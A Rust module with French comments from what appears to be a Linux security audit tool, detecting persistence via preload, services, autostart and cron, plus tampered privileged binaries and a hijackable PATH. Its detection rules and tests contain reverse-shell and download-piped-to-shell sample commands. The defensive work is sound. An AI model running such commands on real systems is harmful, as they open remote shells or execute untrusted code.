//! Ce qui se cache : persistance (préchargement, services, démarrage de session, cron), programmes
//! privilégiés hors paquet ou modifiés, PATH piégeable.

use super::*;

/// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
pub(super) fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
    let reste = fichier.strip_prefix("/usr").ok()?;
    ["bin", "sbin", "lib", "lib64"]
        .iter()
        .any(|d| reste.starts_with(d))
        .then(|| Path::new("/").join(reste))
}

/// Paquet donné par « dpkg -S » : « libc6:amd64, libc6-dbg: /chemin » → « libc6:amd64 ». Les lignes
/// « diversion by … » parlent d'un fichier détourné, pas de son propriétaire.
pub(super) fn paquet_dpkg(texte: &str) -> Option<String> {
    texte
        .lines()
        .filter(|l| !l.starts_with("diversion "))
        .find_map(|l| l.split_once(": ")?.0.split(", ").next().map(str::to_string))
}

/// Empreinte SHA-256 enregistrée pour ce fichier dans le mtree d'un paquet pacman (« ./usr/bin/sudo … sha256digest=… »).
pub(super) fn empreinte_mtree(mtree: &str, fichier: &Path) -> Option<String> {
    let debut = format!(".{} ", fichier.display());
    mtree
        .lines()
        .find(|l| l.starts_with(&debut))?
        .split_whitespace()
        .find_map(|c| c.strip_prefix("sha256digest="))
        .map(str::to_string)
}

/// Sortie de dpkg --verify ou rpm -V : le 3e caractère vaut « 5 » quand le contenu (empreinte) a changé.
/// Les autres différences (date, droits) ne prouvent pas un remplacement du programme.
pub(super) fn contenu_modifie(verif: &str, fichier: &Path) -> bool {
    let chemin = fichier.to_string_lossy();
    verif
        .lines()
        .any(|l| l.split_whitespace().last() == Some(&*chemin) && l.chars().nth(2) == Some('5'))
}

/// Dossiers du PATH dangereux : modifiables par tout le monde (sans « sticky bit ») ou relatifs (« . »).
pub(super) fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<String> {
    path.split(':')
        .filter(|d| d.is_empty() || !d.starts_with('/') || droits(d).is_some_and(|m| m & 0o002 != 0 && m & 0o1000 == 0))
        .map(|d| {
            if d.is_empty() {
                "(vide = dossier courant)".to_string()
            } else {
                d.to_string()
            }
        })
        .collect()
}

/// Un fichier de démarrage ou de configuration tel qu'il est montré : « ~/… » sous le dossier personnel `maison`, et
/// rendu inoffensif (dans /etc/profile.d ou ~/.config/autostart, le nom est celui qu'a choisi qui a posé le fichier).
pub(super) fn court(p: &Path, maison: &Path) -> String {
    crate::ui::affichable(
        &p.strip_prefix(maison)
            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display())),
    )
}

/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
pub(super) fn commentaire(ligne: &str) -> bool {
    let l = ligne.trim_start();
    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
}

/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
pub(super) const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
    ".local",
    ".config",
    ".cargo",
    ".rustup",
    ".nix-profile",
    ".npm-global",
    ".bun",
    ".deno",
    ".dotnet",
    ".steam",
];

/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
pub(super) fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
    let mots: Vec<&str> = commande.split_whitespace().collect();
    // Les mots coupés aussi sur ce qui sépare ou groupe les commandes du shell, comme pour la chasse :
    // « (nc -e /bin/sh … &) » ou « x;nc -e … » cachaient nc dans « (nc » ou « x;nc ». Un programme se compare par
    // son nom de fichier (« /bin/nc »), une option telle quelle.
    let mots_du_shell: Vec<&str> = crate::machine::chasse::mots(commande)
        .into_iter()
        .map(|(m, _)| m)
        .collect();
    let a = |m: &str| {
        mots_du_shell
            .iter()
            .any(|x| x.trim_matches(|c| c == '"' || c == '\'') == m || crate::machine::chasse::nom_de_fichier(x) == m)
    };
    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
        return Some(tr!(
            "connexion réseau ouverte par le shell (shell inversé)",
            "network connection opened by the shell (reverse shell)"
        ));
    }
    if (a("nc") || a("ncat") || a("netcat")) && (a("-e") || a("-c")) {
        return Some(tr!(
            "netcat qui donne un shell (shell inversé)",
            "netcat giving a shell (reverse shell)"
        ));
    }
    // Téléchargé ou décodé puis passé à un interpréteur : le même jugement que pour les programmes en marche.
    if let Some(motif) = crate::machine::chasse::passe_a_un_shell(commande) {
        return Some(motif.raison);
    }
    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
        return Some(tr!("commande cachée en base64", "command hidden in base64"));
    }
    if !lancement {
        return None;
    }
    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! »).
    let programme = mots
        .first()?
        .trim_matches(|c| c == '"' || c == '\'')
        .trim_start_matches(['-', '@', '+', '!', ':']);
    if ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|d| programme.starts_with(d))
    {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    let maison = home();
    let relatif = programme
        .strip_prefix("~/")
        .or_else(|| programme.strip_prefix("$HOME/"))
        .or_else(|| programme.strip_prefix("%h/"))
        .or_else(|| {
            (!maison.is_empty())
                .then(|| programme.strip_prefix(&format!("{maison}/")))
                .flatten()
        });
    if let Some(r) = relatif {
        let premier = r.split('/').next().unwrap_or("");
        if premier.starts_with('.') && r.contains('/') && !DOSSIERS_CACHES_NORMAUX.contains(&premier) {
            return Some(tr!(
                "programme rangé dans un dossier caché du dossier personnel",
                "program stored in a hidden folder of the home folder"
            ));
        }
    }
    None
}

/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
pub(super) fn commande_lancee(ligne: &str) -> Option<String> {
    let l = ligne.trim();
    if commentaire(l) {
        return None;
    }
    if let Some((cle, valeur)) = l.split_once('=') {
        let cle = cle.trim();
        if cle.starts_with("Exec") || ["exec-once", "exec", "exec-shutdown"].contains(&cle) {
            return Some(valeur.trim().to_string());
        }
    }
    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
        .iter()
        .any(|m| l.contains(m))
    {
        let debut = l.find(['"', '\''])?;
        let fin = l.rfind(['"', '\''])?;
        return (fin > debut).then(|| l[debut + 1..fin].to_string());
    }
    None
}

/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; « unset » la retire.
pub(super) fn definit_prechargement(ligne: &str) -> bool {
    !commentaire(ligne)
        && (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT"))
        && !ligne.trim_start().starts_with("unset")
}

/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), sans suivre les liens d'activation.
pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    for e in std::fs::read_dir(dossier).into_iter().flatten().flatten() {
        let p = e.path();
        let Ok(t) = e.file_type() else { continue };
        if t.is_dir() && (p.extension().is_some_and(|x| x == "d") || dossier.ends_with("hypr")) {
            trouve.extend(fichiers_de(&p, extensions));
        } else if t.is_file() && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
            trouve.push(p);
        }
    }
    trouve
}

/// Une ligne signalée dans une clé : sa source et l'empreinte de son texte (jamais le texte, écrit par qui l'a posée).
fn source_de(origine: &str, ligne: &str) -> String {
    format!("{origine}#{}", crate::modele::id::trace(ligne))
}

/// L'objet de l'alerte des lancements : ses lignes signalées, triées et sans double (l'ordre de lecture ne compte
/// pas, deux lignes identiques comptent une fois).
fn objet_des_lancements(mut sources: Vec<String>) -> crate::modele::Objet {
    sources.sort();
    sources.dedup();
    crate::modele::Objet::de("lancements", &sources.join(","))
}

/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
pub(super) fn persistance() -> Vec<Constat> {
    persistance_dans(
        Path::new("/"),
        Path::new(&home()),
        |var| std::env::var_os(var),
        sortie("crontab", &["-l"]),
        Paquets::detecter(),
    )
}

/// La persistance lue sous `racine` (« / » au bilan ; une arborescence fabriquée pour le corpus de détection), le
/// dossier personnel `maison`, les variables de cette session (`variable`), la crontab du compte et le gestionnaire
/// de paquets donnés : la même lecture et le même jugement, sans rien toucher hors de la racine.
pub(super) fn persistance_dans(
    racine: &Path,
    maison: &Path,
    variable: impl Fn(&str) -> Option<std::ffi::OsString>,
    crontab: Option<String>,
    gestion: Option<Paquets>,
) -> Vec<Constat> {
    const CAT: &str = "Persistance";
    let h = maison.to_path_buf();
    let etc = |chemin: &str| racine.join(chemin);
    let mut critiques = Vec::new();
    let mut suspects = Vec::new();
    // D'où vient chaque ligne signalée et l'empreinte de son texte (`source_de`), sans langue ni numéro de ligne :
    // l'objet de l'alerte, qui change dès qu'une autre ligne ou une autre source s'ajoute (accepter les lignes
    // d'aujourd'hui ne tait jamais celles de demain, même dans un fichier déjà signalé).
    let mut sources: Vec<String> = Vec::new();

    // /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris.
    // Technique classique des rootkits ; presque aucun système normal n'en a.
    if let Ok(texte) = std::fs::read_to_string(etc("etc/ld.so.preload")) {
        for lib in texte
            .lines()
            .filter(|l| !commentaire(l))
            .flat_map(str::split_whitespace)
        {
            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
            sources.push(source_de("preload", lib));
            // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
            let lib = crate::ui::affichable(lib);
            if connue {
                suspects.push(trf!(
                    "/etc/ld.so.preload charge {lib} dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} into every program"
                ));
            } else {
                critiques.push(trf!(
                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} (not from a package) into every program"
                ));
            }
        }
    }
    for var in ["LD_PRELOAD", "LD_AUDIT"] {
        if let Some(v) = variable(var).filter(|v| !v.is_empty()) {
            sources.push(source_de(&format!("env:{var}"), &v.to_string_lossy()));
            suspects.push(trf!(
                "{var}={} est défini pour cette session",
                "{var}={} is set for this session",
                crate::ui::affichable(&v.to_string_lossy())
            ));
        }
    }

    let mut configuration: Vec<std::path::PathBuf> = [
        "etc/environment",
        "etc/profile",
        "etc/bash.bashrc",
        "etc/zsh/zshenv",
        "etc/zsh/zprofile",
    ]
    .iter()
    .map(|c| etc(c))
    .collect();
    configuration.extend(fichiers_de(&etc("etc/profile.d"), &["sh", "zsh"]));
    configuration.extend(fichiers_de(&etc("etc/environment.d"), &["conf"]));
    configuration.extend(
        [
            ".profile",
            ".bash_profile",
            ".bashrc",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".xprofile",
        ]
        .iter()
        .map(|f| h.join(f)),
    );
    configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
    configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
    for f in std::fs::read_dir(h.join(".config/uwsm"))
        .into_iter()
        .flatten()
        .flatten()
    {
        if f.file_name().to_string_lossy().starts_with("env") && f.path().is_file() {
            configuration.push(f.path());
        }
    }

    // Fichiers dont des lignes lancent des programmes.
    let mut demarrage = fichiers_de(
        &etc("etc/systemd/system"),
        &["service", "timer", "socket", "path", "conf"],
    );
    demarrage.retain(|p| !p.is_symlink());
    demarrage.extend(fichiers_de(
        &h.join(".config/systemd/user"),
        &["service", "timer", "socket", "path", "conf"],
    ));
    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
    demarrage.extend(fichiers_de(&etc("etc/xdg/autostart"), &["desktop"]));
    let hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
    demarrage.extend(hypr.iter().cloned());
    configuration.extend(hypr);

    for f in &configuration {
        let Ok(texte) = std::fs::read_to_string(f) else {
            continue;
        };
        for (n, l) in texte.lines().enumerate() {
            if definit_prechargement(l) {
                sources.push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                suspects.push(trf!(
                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                    "{}:{} preloads a library (LD_PRELOAD)",
                    court(f, &h),
                    n + 1
                ));
            } else if !commentaire(l)
                && !demarrage.contains(f)
                && let Some(raison) = commande_suspecte(l, false)
            {
                sources.push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                suspects.push(trf!("{}:{} : {raison}", "{}:{}: {raison}", court(f, &h), n + 1));
            }
        }
    }
    for f in &demarrage {
        let Ok(texte) = std::fs::read_to_string(f) else {
            continue;
        };
        for (n, l) in texte.lines().enumerate() {
            if let Some(raison) = commande_lancee(l).and_then(|c| commande_suspecte(&c, true)) {
                sources.push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                suspects.push(trf!("{}:{} : {raison}", "{}:{}: {raison}", court(f, &h), n + 1));
            }
        }
    }
    // crontab de l'utilisateur et du système : chaque ligne est une commande.
    let mut cron: Vec<(String, String)> = crontab
        .unwrap_or_default()
        .lines()
        .map(|l| ("crontab".to_string(), l.to_string()))
        .collect();
    let mut fichiers_cron = vec![etc("etc/crontab")];
    fichiers_cron.extend(
        std::fs::read_dir(etc("etc/cron.d"))
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path()),
    );
    for f in fichiers_cron {
        for l in std::fs::read_to_string(&f).unwrap_or_default().lines() {
            cron.push((crate::ui::chemin_affichable(&f), l.to_string()));
        }
    }
    for (source, l) in cron.iter().filter(|(_, l)| !commentaire(l)) {
        if let Some(raison) = commande_suspecte(l, false) {
            let origine = if source == "crontab" {
                "crontab".to_string()
            } else {
                crate::modele::id::chemin(source)
            };
            sources.push(source_de(&origine, l));
            suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
        }
    }

    let mut constats = Vec::new();
    suspects.sort();
    suspects.dedup();
    if critiques.is_empty() && suspects.is_empty() {
        constats.push(ok(
            CAT,
            tr!(
                "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
                "No suspicious autostart (preloading, services, session startup, cron)."
            ),
        ));
    } else {
        let niveau = if critiques.is_empty() {
            Niveau::Eleve
        } else {
            Niveau::Critique
        };
        let mut liste = critiques;
        liste.extend(suspects);
        let reste = liste.len().saturating_sub(6);
        liste.truncate(6);
        let mut message = trf!(
            "Lancement automatique suspect : {}",
            "Suspicious autostart: {}",
            liste.join(" ; ")
        );
        if reste > 0 {
            let _ = trw!(message, " ; et {reste} autre(s)", "; and {reste} more");
        }
        message.push('.');
        constats.push(alerte(CAT, niveau, message).avec_objet(objet_des_lancements(sources)).manuel(
            tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que vous n'avez pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
            &[],
        ));
    }

    // Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root.
    // On les nomme pour que tu les reconnaisses, sans baisser la note.
    if let Some(gestion) = gestion {
        let systeme = etc("etc/systemd/system");
        let mut ajoutes: Vec<String> = fichiers_de(&systeme, &["service", "timer"])
            .into_iter()
            .filter(|p| p.parent() == Some(systeme.as_path()) && !p.is_symlink())
            .filter(|p| !gestion.possede(p))
            .filter_map(|p| p.file_name().map(|n| crate::ui::affichable(&n.to_string_lossy())))
            .collect();
        ajoutes.sort();
        if !ajoutes.is_empty() {
            let premier = ajoutes[0].clone();
            constats.push(
                alerte(
                    CAT,
                    Niveau::Info,
                    trf!(
                        "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
                        "{} system service(s) added by hand, not from a package: {}. Check that you recognize them.",
                        ajoutes.len(),
                        ajoutes.join(", ")
                    ),
                )
                .avec_objet(crate::modele::Objet::de("services", &ajoutes.join(",")))
                .manuel(
                    tr!(
                        "Si vous n'en reconnaissez pas un, lisez ce qu'il lance avant de le désactiver",
                        "If you do not recognize one, read what it starts before turning it off"
                    ),
                    &[&format!("systemctl cat {premier}")],
                ),
            );
        }
    }
    constats
}

/// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
pub(super) fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
    texte
        .lines()
        .filter_map(|l| l.split_once(" = ").or_else(|| l.rsplit_once(' ')))
        .filter(|(f, caps)| f.starts_with('/') && caps.contains("cap_"))
        .map(|(f, _)| std::path::PathBuf::from(f))
        .collect()
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
pub(super) fn fichiers_suspects() -> Vec<Constat> {
    use std::os::unix::fs::PermissionsExt;
    fn parcourir(d: &Path, profondeur: u32, trouve: &mut Vec<std::path::PathBuf>, test: &dyn Fn(&Path) -> bool) {
        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
            let p = e.path();
            if e.file_type().is_ok_and(|t| t.is_dir()) {
                if profondeur > 0 {
                    parcourir(&p, profondeur - 1, trouve, test);
                }
            } else if test(&p) {
                trouve.push(p);
            }
        }
    }
    use std::os::unix::fs::MetadataExt;
    // Propriétaire du processus, lu sur /proc/self (sans dépendance à la libc).
    let moi = std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid());
    // Dans un dossier temporaire ou personnel, un setuid à soi ne donne aucun droit de plus ; un setuid à un autre
    // compte (root) ou un setgid du groupe root, si.
    let dangereux_hors_systeme = |p: &Path| {
        p.symlink_metadata().is_ok_and(|m| {
            m.is_file()
                && ((m.permissions().mode() & 0o4000 != 0 && m.uid() != moi)
                    || (m.permissions().mode() & 0o2000 != 0 && m.gid() == 0))
        })
    };
    let privilegie = |p: &Path| {
        p.symlink_metadata()
            .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o6000 != 0)
    };
    // Capacités (setcap) : droits root partiels, invisibles dans « ls -l ». Poser une capacité demande root.
    // Lancé tout de suite, en même temps que les parcours : getcap relit tout /usr/lib (0,6 s).
    let capacites = std::thread::spawn(|| {
        sortie(
            "getcap",
            &[
                "-r",
                "/usr/bin",
                "/usr/sbin",
                "/usr/local",
                "/usr/lib",
                "/usr/libexec",
                "/opt",
                "/tmp",
                "/var/tmp",
                "/dev/shm",
            ],
        )
        .map(|s| fichiers_capacites(&s))
    });
    let mut anormaux = Vec::new();
    for (d, prof) in [("/tmp", 3), ("/var/tmp", 3), ("/dev/shm", 3), (&home() as &str, 2)] {
        parcourir(Path::new(d), prof, &mut anormaux, &dangereux_hors_systeme);
    }
    // Dans les dossiers système : chaque setuid ou setgid doit venir d'un paquet, et être intact.
    let mut systeme = Vec::new();
    for (d, prof) in [
        ("/usr/bin", 0),
        ("/usr/sbin", 0),
        ("/usr/local/bin", 0),
        ("/usr/local/sbin", 0),
        ("/usr/lib", 2),
        ("/usr/libexec", 2),
        ("/opt", 3),
    ] {
        parcourir(Path::new(d), prof, &mut systeme, &privilegie);
    }
    let capacites = capacites.join().ok().flatten();
    for p in capacites.iter().flatten() {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| p.starts_with(d)) {
            anormaux.push(p.clone());
        } else if !systeme.contains(p) {
            systeme.push(p.clone());
        }
    }
    // /usr/sbin est un lien vers /usr/bin sur Arch : chemin réel (celui que connaît le paquet), sans doublon.
    let mut systeme: Vec<std::path::PathBuf> = systeme
        .into_iter()
        .map(|p| std::fs::canonicalize(&p).unwrap_or(p))
        .collect();
    systeme.sort();
    systeme.dedup();
    let gestion = Paquets::detecter();
    let mut par_paquet: std::collections::BTreeMap<String, Vec<std::path::PathBuf>> = std::collections::BTreeMap::new();
    if let Some(gestion) = gestion {
        for (p, proprietaire) in systeme.iter().zip(gestion.proprietaires(&systeme)) {
            match proprietaire {
                Some(paquet) => par_paquet.entry(paquet).or_default().push(p.clone()),
                None => anormaux.push(p.clone()),
            }
        }
    }
    let (mut modifies, mut non_verifies) = (Vec::new(), 0);
    if let Some(gestion) = gestion {
        // Chaque paquet se vérifie à part (pacman, zcat et sha256sum, ou dpkg --verify, en lecture seule) : 16 à la
        // fois plutôt qu'un par un, une vingtaine de paquets attendaient l'un après l'autre.
        let paquets: Vec<(&String, &Vec<std::path::PathBuf>)> = par_paquet.iter().collect();
        let mut etats = Vec::new();
        for groupe in paquets.chunks(16) {
            std::thread::scope(|s| {
                let fils: Vec<_> = groupe
                    .iter()
                    .map(|(paquet, fichiers)| s.spawn(move || gestion.modifies(paquet, fichiers)))
                    .collect();
                etats.extend(fils.into_iter().map(|f| f.join().unwrap_or_default()));
            });
        }
        for ((paquet, fichiers), etats) in paquets.into_iter().zip(etats) {
            // Un fil qui a planté rend une liste vide : ses fichiers comptent comme non vérifiés.
            let etats = etats.into_iter().chain(std::iter::repeat(None));
            for (f, etat) in fichiers.iter().zip(etats) {
                match etat {
                    Some(true) => modifies.push((crate::ui::chemin_affichable(f), paquet.clone())),
                    Some(false) => {}
                    None => non_verifies += 1,
                }
            }
        }
    }
    let reinstaller = {
        let mut paquets: Vec<&str> = modifies.iter().map(|(_, p)| p.as_str()).collect();
        paquets.dedup();
        gestion.map(|g| g.reinstaller(&paquets.join(" "))).unwrap_or_default()
    };
    let path = std::env::var("PATH").unwrap_or_default();
    let path_dangereux = path_dangereux(&path, |d| std::fs::metadata(d).ok().map(|m| m.permissions().mode()));
    juger_fichiers_suspects(&Releve {
        modifies,
        anormaux,
        systeme: systeme.len(),
        gestion: gestion.is_some(),
        non_verifies,
        capacites_lues: capacites.is_some(),
        path_dangereux,
        reinstaller,
    })
}

/// Ce que la lecture des programmes privilégiés a relevé, pour son jugement (séparé pour le corpus de détection).
pub(super) struct Releve {
    /// Programmes privilégiés changés depuis leur installation : (chemin montré, paquet).
    pub modifies: Vec<(String, String)>,
    /// Hors paquet, ou dans un dossier temporaire.
    pub anormaux: Vec<std::path::PathBuf>,
    /// Combien de programmes privilégiés dans les dossiers du système.
    pub systeme: usize,
    /// Le gestionnaire de paquets est reconnu.
    pub gestion: bool,
    pub non_verifies: usize,
    /// getcap a répondu.
    pub capacites_lues: bool,
    /// Les dossiers du PATH où d'autres peuvent écrire.
    pub path_dangereux: Vec<String>,
    /// La commande qui remet les paquets des programmes modifiés.
    pub reinstaller: String,
}

pub(super) fn juger_fichiers_suspects(r: &Releve) -> Vec<Constat> {
    let Releve {
        modifies,
        anormaux,
        systeme: n,
        gestion,
        non_verifies,
        capacites_lues,
        path_dangereux: dangereux,
        reinstaller,
    } = r;
    let (n, non_verifies) = (*n, *non_verifies);
    let mut constats = Vec::new();
    if !modifies.is_empty() {
        let liste: Vec<String> = modifies
            .iter()
            .map(|(f, p)| trf!("{f} (paquet {p})", "{f} (package {p})"))
            .collect();
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Critique,
                trf!(
                    "Programme(s) privilégié(s) modifié(s) depuis leur installation : {}. Signe possible d'une porte dérobée.", "Privileged program(s) modified since install: {}. Possible sign of a backdoor.",
                    liste.join(", ")
                ),
            )
            .manuel(
                tr!("Ne pas le lancer. Remettre l'original depuis les dépôts, puis lancer l'antivirus et changer vos mots de passe", "Do not run it. Restore the original from the repositories, then run the antivirus and change your passwords"),
                &[reinstaller],
            ),
        );
    }
    if !anormaux.is_empty() {
        // Dans un dossier temporaire, n'importe qui choisit le nom : montré (message et commandes à taper), il est
        // rendu inoffensif.
        let liste: Vec<String> = anormaux
            .iter()
            .take(10)
            .map(|p| crate::ui::chemin_affichable(p))
            .collect();
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "Programme(s) setuid, setgid ou à capacités hors paquet ou dans un dossier temporaire : {}.", "Setuid, setgid or capability program(s) not from a package or in a temporary folder: {}.",
                    liste.join(", ")
                ),
            )
            .manuel(
                tr!("Ces programmes peuvent donner des droits root : vérifier d'où ils viennent avant toute chose (ne pas les lancer)", "These programs can give root rights: check where they come from before anything else (do not run them)"),
                &[&format!("ls -l {}", liste.join(" ")), &format!("getcap {}", liste.join(" "))],
            ),
        );
    }
    if modifies.is_empty() && anormaux.is_empty() {
        let mut message = match (gestion, non_verifies) {
            (false, _) => trf!(
                "Aucun programme privilégié dans les dossiers temporaires ; les {n} du système n'ont pas pu être \
                 rapprochés d'un paquet (gestionnaire de paquets non reconnu).",
                "No privileged program in temporary folders; the {n} system ones could not be \
                 matched to a package (package manager not recognized)."
            ),
            (true, 0) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet et intacts.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package and intact."
            ),
            (true, k) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet ; \
                 {k} illisible(s), donc non comparé(s) à l'original.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package; \
                 {k} unreadable, so not compared to the original."
            ),
        };
        if !capacites_lues {
            message.push_str(tr!(
                " Capacités non vérifiées (getcap absent).",
                " Capabilities not checked (getcap missing)."
            ));
        }
        constats.push(ok("Fichiers suspects", message));
    }
    if !dangereux.is_empty() {
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "PATH piégeable : {} (n'importe qui peut y déposer un faux « ls » ou « sudo »).",
                    "Hijackable PATH: {} (anyone can drop a fake “ls” or “sudo” there).",
                    dangereux.join(", ")
                ),
            )
            .manuel(
                tr!(
                    "Retirer ces dossiers du PATH (~/.bashrc, ~/.profile) ou corriger leurs droits",
                    "Remove these folders from the PATH (~/.bashrc, ~/.profile) or fix their permissions"
                ),
                &[],
            ),
        );
    }
    constats
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Une seconde ligne suspecte dans un fichier déjà signalé change la clé (avant, seul le fichier y était) ;
    /// l'ordre de lecture et une ligne lue deux fois, non.
    #[test]
    fn nouvelle_ligne_nouvelle_cle() {
        let r1 = "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1";
        let r2 = "curl -s http://exemple.invalid/x | sh";
        let cle = |lignes: &[&str]| {
            let sources = lignes.iter().map(|l| source_de("~/.bashrc", l)).collect();
            crate::modele::Cle::de("LNX-PRS-002", &objet_des_lancements(sources)).unwrap()
        };
        assert_ne!(cle(&[r1]), cle(&[r1, r2]));
        assert_eq!(cle(&[r1, r2]), cle(&[r2, r1, r2]));
        assert_ne!(cle(&[r1]), cle(&[r2]));
        // Les blancs du bord ne changent pas la ligne ; une autre source, si.
        assert_eq!(source_de("crontab", r1), source_de("crontab", &format!("  {r1}\t")));
        assert_ne!(source_de("crontab", r1), source_de("~/.bashrc", r1));
    }

    #[test]
    fn chemins_avant_fusion_de_usr() {
        assert_eq!(
            chemin_hors_usr(Path::new("/usr/bin/fusermount3")).unwrap(),
            Path::new("/bin/fusermount3")
        );
        assert_eq!(chemin_hors_usr(Path::new("/usr/sbin/x")).unwrap(), Path::new("/sbin/x"));
        assert!(chemin_hors_usr(Path::new("/usr/local/bin/x")).is_none());
        assert!(chemin_hors_usr(Path::new("/opt/x")).is_none());
    }

    #[test]
    fn path_piegeable() {
        let droits = |d: &str| match d {
            "/tmp" => Some(0o41777),         // modifiable par tous mais « sticky » : sûr
            "/srv/partage" => Some(0o40777), // modifiable par tous, sans sticky : piège
            _ => Some(0o40755),
        };
        assert_eq!(
            path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
            vec!["/srv/partage", ".", "(vide = dossier courant)"]
        );
        assert_eq!(
            path_dangereux("/usr/local/bin:/usr/bin", droits),
            [] as [std::string::String; 0]
        );
    }

    #[test]
    fn programmes_privilegies() {
        assert_eq!(
            fichiers_capacites(
                "/usr/bin/newuidmap cap_setuid=ep\n/usr/bin/ping = cap_net_raw+ep\n/tmp/un dossier/x cap_sys_admin=ep\n"
            ),
            ["/usr/bin/newuidmap", "/usr/bin/ping", "/tmp/un dossier/x"].map(std::path::PathBuf::from)
        );
        assert_eq!(
            paquet_dpkg("libc6:amd64, libc6-dbg: /usr/bin/ldd\n").as_deref(),
            Some("libc6:amd64")
        );
        assert_eq!(
            paquet_dpkg("diversion by dash from: /bin/sh\ndash: /bin/sh\n").as_deref(),
            Some("dash")
        );
        let mtree = "#mtree\n./usr/bin/sudoedit time=1.0 type=link link=sudo\n./usr/bin/sudo time=1.0 mode=4755 sha256digest=e9f8\n";
        assert_eq!(
            empreinte_mtree(mtree, Path::new("/usr/bin/sudo")).as_deref(),
            Some("e9f8")
        );
        assert_eq!(empreinte_mtree(mtree, Path::new("/usr/bin/sudoedit")), None);
        // Seul « 5 » (contenu) compte : une date ou des droits changés ne prouvent pas un remplacement.
        let verif = "??5??????   /usr/bin/passwd\n.M.......   /usr/bin/su\nS.5....T.  c /etc/sudoers\n";
        assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
    }

    #[test]
    fn lancements_suspects() {
        // Formes de porte dérobée reconnues partout.
        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
        // nc caché dans une sous-commande, après un « ; » ou derrière un chemin.
        for ligne in [
